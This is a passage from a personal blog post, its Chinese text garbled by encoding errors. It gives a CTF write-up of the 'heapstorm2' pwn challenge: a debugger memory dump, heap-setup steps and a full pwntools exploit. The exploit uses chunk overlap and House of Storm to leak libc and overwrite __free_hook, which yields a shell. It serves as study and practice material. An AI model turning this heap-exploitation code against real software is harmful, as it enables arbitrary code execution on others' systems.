<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x561071a20020</span></span><br><span class="line"><span class="number">0x561071a20020</span>:	<span class="number">0x49495f4d524f5453</span>	<span class="number">0x0000000000000531</span>-&gt;<span class="number">1</span></span><br><span class="line"><span class="number">0x561071a20030</span>:	<span class="number">0x00007fe7da00ab78</span>	<span class="number">0x00007fe7da00ab78</span></span><br><span class="line"><span class="number">0x561071a20040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span>-&gt;<span class="number">7</span></span><br><span class="line"><span class="number">0x561071a20050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x561071a20060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x561071a20070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x561071a20080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x561071a20090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x561071a200a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x561071a200b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹è§chunk1å’Œchunk2åˆå¹¶äº†,ç„¶ååˆå¹¶çš„chunkåŒ…å«chunk7ï¼ˆæ­¤æ—¶æœ‰ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘ä»–ï¼‰,ç„¶åå†æŠŠchunkç”³è¯·å‡ºæ¥ï¼Œå°±æœ‰ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘chunk7äº†ï¼Œæ„æˆäº†ufa,</p>
<p>chunk7æ˜¯ largeæ‰€ä»¥å¯ä»¥ç”¨houseofstormæ¥æ‰“0x13370800.æ­¤æ—¶åªéœ€è¦å†æ¥ä¸€ä¸ªå¯ä»¥æ§åˆ¶çš„chunkå°±å¥½äº†ï¼Œå¦‚æ³•ç‚®åˆ¶</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x508</span>)<span class="comment">#1</span></span><br><span class="line">update(<span class="number">1</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x508</span>)<span class="comment">#4</span></span><br><span class="line">update(<span class="number">1</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">update(<span class="number">0</span>,<span class="string">&#x27;s&#x27;</span>*(<span class="number">0x18</span>-<span class="number">12</span>))</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4d8</span>)<span class="comment">#7 overlap</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># add(0x18)</span></span><br><span class="line"><span class="comment"># add(0x4d8)</span></span><br><span class="line">add(<span class="number">0x38</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4e8</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">4</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">update(<span class="number">3</span>,<span class="string">&#x27;s&#x27;</span>*(<span class="number">0x18</span>-<span class="number">12</span>))</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x4d8</span>)<span class="comment">#8</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x48</span>)<span class="comment">#4</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±èƒ½æ§åˆ¶ä¸¤ä¸ªchunklçš„fd,bk,fd_nextsize,bk_sizeäº†ï¼Œè®©è¿™ä¸¤ä¸ªä¸€ä¸ªåœ¨largeä¸€ä¸ªåœ¨unsortedï¼Œå…¶ä¸­ä¸€ä¸ªchunkæ˜¯chunk2ï¼Œå¤§å°ä¸º0x4f0,ä¸€ä¸ªç°åœ¨è¿˜å¾…åœ¨unsortefd,å¤§å°ä¸º0x4e0,æ„æˆhouseofstormå¾—è¦ä¸€ä¸ªè¾ƒå°çš„åœ¨largebinä¸Šï¼Œä¸€ä¸ªè¾ƒå¤§çš„åœ¨unsortedä¸Šï¼Œé€šè¿‡ä¸¤æ¬¡free(2)å®Œæˆè¿™ä¸€æ­¥</p>
<p>åˆ°è¿™é‡Œå°±å·²ç»å®Œæˆäº†houseofstormçš„å‰ç½®æ¡ä»¶äº†ï¼Œä¸‹é¢å°±é€šè¿‡houseofstormæ¥å®Œæˆä»»æ„åœ°å€ç”³è¯·å°±å¥½äº†ã€‚</p>
<p>houseofstormå‰é¢æ‹è¿‡äº†ï¼Œå°±ä¸å±•å¼€èµ˜è¿°äº†</p>
<p>ä¸‹é¢æ˜¯å®Œæ•´ä»£ç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./heapstorm2&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">ogg=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)   </span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>) </span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="keyword">while</span>  <span class="literal">True</span>:</span><br><span class="line">        <span class="comment">#sh=process(&#x27;./heapstorm2&#x27;)</span></span><br><span class="line">        <span class="comment">#sh=remote(&#x27;node4.buuoj.cn&#x27;,29023)</span></span><br><span class="line">        <span class="comment">#gdb.attach(sh,&quot;b main&quot;)</span></span><br><span class="line">        add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">        add(<span class="number">0x508</span>)<span class="comment">#1</span></span><br><span class="line">        update(<span class="number">1</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">        add(<span class="number">0x18</span>)<span class="comment">#2</span></span><br><span class="line">        add(<span class="number">0x18</span>)<span class="comment">#3</span></span><br><span class="line">        add(<span class="number">0x508</span>)<span class="comment">#4</span></span><br><span class="line">        update(<span class="number">1</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">        add(<span class="number">0x18</span>)<span class="comment">#5</span></span><br><span class="line">        add(<span class="number">0x18</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        update(<span class="number">0</span>,<span class="string">&#x27;s&#x27;</span>*(<span class="number">0x18</span>-<span class="number">12</span>))</span><br><span class="line">        add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">        add(<span class="number">0x4d8</span>)<span class="comment">#7 overlap</span></span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># add(0x18)</span></span><br><span class="line">        <span class="comment"># add(0x4d8)</span></span><br><span class="line">        add(<span class="number">0x38</span>)<span class="comment">#1</span></span><br><span class="line">        add(<span class="number">0x4e8</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">        update(<span class="number">4</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">        free(<span class="number">4</span>)</span><br><span class="line">        update(<span class="number">3</span>,<span class="string">&#x27;s&#x27;</span>*(<span class="number">0x18</span>-<span class="number">12</span>))</span><br><span class="line">        add(<span class="number">0x18</span>)<span class="comment">#4</span></span><br><span class="line">        add(<span class="number">0x4d8</span>)<span class="comment">#8</span></span><br><span class="line">        free(<span class="number">4</span>)</span><br><span class="line">        free(<span class="number">5</span>)</span><br><span class="line">        add(<span class="number">0x48</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line">        add(<span class="number">0x4e8</span>)<span class="comment">#2</span></span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#unsorted bin</span></span><br><span class="line">        fake_chunk=<span class="number">0x13370800</span>-<span class="number">0x20</span></span><br><span class="line">        p1=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x4f1</span>)</span><br><span class="line">        p1+=p64(<span class="number">0</span>)+p64(fake_chunk)</span><br><span class="line">        update(<span class="number">7</span>,p1)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#large bin</span></span><br><span class="line">        p=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x4e1</span>)</span><br><span class="line">        p+=p64(<span class="number">0</span>)+p64(fake_chunk+<span class="number">8</span>)</span><br><span class="line">        p+=p64(<span class="number">0</span>)+p64(fake_chunk-<span class="number">0x18</span>-<span class="number">5</span>)</span><br><span class="line">        update(<span class="number">8</span>,p)</span><br><span class="line">        add(<span class="number">0x48</span>)<span class="comment">#2</span></span><br><span class="line">        p2=p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x13377331</span>)</span><br><span class="line">        p2+=p64(<span class="number">0x13370800</span>)</span><br><span class="line">        update(<span class="number">2</span>,p2)</span><br><span class="line">        p3=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x13377331</span>)+p64(<span class="number">0x13370800</span>)</span><br><span class="line">        p3+=p64(<span class="number">0x1000</span>)+p64(fake_chunk+<span class="number">3</span>)+p64(<span class="number">8</span>)</span><br><span class="line">        update(<span class="number">0</span>,p3)</span><br><span class="line">        show(<span class="number">1</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;]: &#x27;</span>)</span><br><span class="line">        heap=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line">        p3=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x13377331</span>)+p64(<span class="number">0x13370800</span>)</span><br><span class="line">        p3+=p64(<span class="number">0x1000</span>)+p64(heap+<span class="number">0x10</span>)+p64(<span class="number">8</span>)</span><br><span class="line">        update(<span class="number">0</span>,p3)</span><br><span class="line">        show(<span class="number">1</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;]: &#x27;</span>)</span><br><span class="line">        hook_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x58</span>-<span class="number">0x10</span></span><br><span class="line">        libc_base=hook_base-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">        free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">        p3=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x13377331</span>)+p64(<span class="number">0x13370800</span>)</span><br><span class="line">        p3+=p64(<span class="number">0x1000</span>)+p64(free_hook)+p64(<span class="number">0x8</span>)</span><br><span class="line">        update(<span class="number">0</span>,p3)</span><br><span class="line">        update(<span class="number">1</span>,p64(ogg[<span class="number">1</span>]+libc_base))</span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        sh.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sh = process(<span class="string">&#x27;./heapstorm2&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwn()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            sh.close()</span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="ä¸Šä¸€é¡µ"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="ä¸‹ä¸€é¡µ"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">rootzhang</p>
  <div class="site-description" itemprop="description">æˆ‘çš„åšå®¢</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">28</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rootzhang</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
